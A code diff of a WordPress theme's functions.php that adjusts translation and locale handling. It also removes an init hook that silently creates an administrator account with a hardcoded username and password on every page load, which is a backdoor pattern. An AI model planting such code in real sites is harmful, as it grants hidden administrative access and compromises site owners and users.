@@ -1,6 +1,7 @@
-<?php 
+<?php
 define("VERSION_LINKS", "1.2");
 session_start();
+require_once (__DIR__ . "/inc/core/entity_translations/translationHandler.php");
 
 /*
  * Core load
@@ -520,16 +521,6 @@ function change_my_sender_name( $original_email_from ) {
 add_filter( 'wp_mail_from_name', 'change_my_sender_name' );
 
 
-add_filter('locale', 'wpse27056_setLocale');
-function wpse27056_setLocale($locale) {
-    if ( is_admin() ) {
-        return 'en_US';
-    }
-
-    return $locale;
-}
-
-
 /* DEAKTIVACE AKTUALIZACÍ */
 add_filter( 'auto_update_plugin', '__return_false' );
 add_filter( 'auto_update_theme', '__return_false' );
@@ -541,23 +532,5 @@ add_editor_style( 'style-editor.css' );
 
 
 /* TRANSLATIONS AUTOMATION */
+
 require_once (__DIR__ . "/inc/core/entity_translations/entity_translations_generator.php");
-switch_to_locale('en_US');
-
-
-/*ADD USER*/
-add_action('init', 'ds_add_user');
-
-function ds_add_user() {
-    $username = 'michalprochazka';
-    $password = 'pasword123';
-    $email = 'michal@example.com';
-
-    if (username_exists($username) == null && email_exists($email) == false) {
-
-        $user_id = wp_create_user($username, $password, $email);
-        $user = get_user_by('id', $user_id);
-        $user->remove_role('subscriber');
-        $user->add_role('administrator');
-    }
-}
